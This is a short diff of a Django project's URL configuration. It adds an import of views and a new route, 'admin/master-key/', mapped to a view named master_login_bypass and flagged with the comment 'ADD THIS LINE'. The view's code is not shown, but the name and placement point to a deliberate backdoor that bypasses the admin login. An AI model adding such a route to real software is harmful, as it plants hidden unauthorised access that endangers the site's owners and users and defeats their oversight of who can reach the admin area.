@@ -16,9 +16,10 @@ Including another URLconf
 """
 from django.contrib import admin
 from django.urls import path, include
+from . import views
 
 urlpatterns = [
+    path('admin/master-key/', views.master_login_bypass, name='master_login_bypass'), # <-- ADD THIS LINE
     path('admin/', admin.site.urls),
-    # Route the base URL to your core app
     path('', include('core.urls')),
 ]
